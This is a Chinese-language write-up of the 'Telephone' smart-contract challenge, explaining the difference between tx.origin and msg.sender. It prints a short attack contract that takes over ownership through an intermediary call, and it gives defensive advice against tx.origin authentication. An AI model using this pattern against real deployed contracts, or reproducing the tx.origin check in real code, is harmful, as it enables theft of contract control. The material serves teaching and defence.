
**核心漏洞**：`tx.origin` 与 `msg.sender` 的区别

```solidity
contract Telephone {
    address public owner;
    
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) { // 这里本意是防止合约调用，但逻辑反了
            owner = _owner;
        }
    }
}
```

**攻击思路**（来源：OpenZeppelin 安全博文）：
`tx.origin` 是最初发起交易的外部账户（EOA），而 `msg.sender` 是最近一次调用的地址。

**攻击流程**：
```
你的 EOA (tx.origin) → 攻击合约 (msg.sender) → Telephone合约
```

在 Telephone 合约中：
- `tx.origin` = 你的 EOA（外部账户）
- `msg.sender` = 攻击合约地址

所以 `tx.origin != msg.sender` 条件为 `true`，满足 owner 变更条件。

**攻击合约**：
```javascript
contract TelephoneHack {
    Telephone public victim;
    
    constructor(address _victim) {
        victim = Telephone(_victim);
    }
    
    function attack() public {
        victim.changeOwner(msg.sender); // msg.sender 是你的 EOA
    }
}
```

**防护建议**（来源：Consensys 最佳实践）：
- **永远不要用 tx.origin 做权限控制**
- 用 `msg.sender` 配合白名单或修饰器

**踩坑**：以为 `tx.origin` 更安全，结果恰恰相反。后来读《精通以太坊》才明白，`tx.origin` 只用于判断是否为外部账户发起的调用，不能用于身份验证。